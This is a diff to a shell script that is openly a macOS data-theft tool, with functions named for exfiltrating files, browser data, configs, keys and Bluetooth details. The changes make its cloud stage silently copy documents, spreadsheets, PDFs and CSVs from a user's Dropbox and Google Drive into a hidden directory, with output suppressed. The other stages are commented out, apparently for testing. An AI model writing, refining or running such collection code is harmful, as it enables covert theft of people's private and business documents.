@@ -21,14 +21,17 @@ exfil_files() {
 }
 
 exfil_cloud() {
+  mkdir -p "$hidden_dir/cloud_files"
   if [ -d "$HOME/Dropbox" ]; then
     cd "$HOME/Dropbox"
-    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/files/" \; &> /dev/null
+    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
   fi
 
-  if [ -d "$HOME/Library/CloudStorage/GoogleDrive" ]; then
-    cd "$HOME/Library/CloudStorage/GoogleDrive"
-    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/files/" \; &> /dev/null
+  google_drive_path="$HOME/Library/CloudStorage/$(ls ~/Library/CloudStorage)"
+  if [ -d "$google_drive_path" ]; then
+    cd "$google_drive_path"
+    cd My\ Drive
+    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
   fi
 }
 
@@ -107,18 +110,18 @@ cleanup() {
 }
 
 
-exfil_files &
+#exfil_files &
 exfil_cloud &
-exfil_browsers &
-exfil_config &
+#exfil_browsers &
+#exfil_config &
 
-network_details
-exfil_bt
-exfil_keys
+#network_details
+#exfil_bt
+#exfil_keys
 
-wait $exfil_files_pid $exfil_browsers_pid
-exfil_compress
-
-wait $exfil_compress
-cleanup
+#wait $exfil_files_pid $exfil_browsers_pid
+#exfil_compress
+#
+#wait $exfil_compress
+#cleanup
 
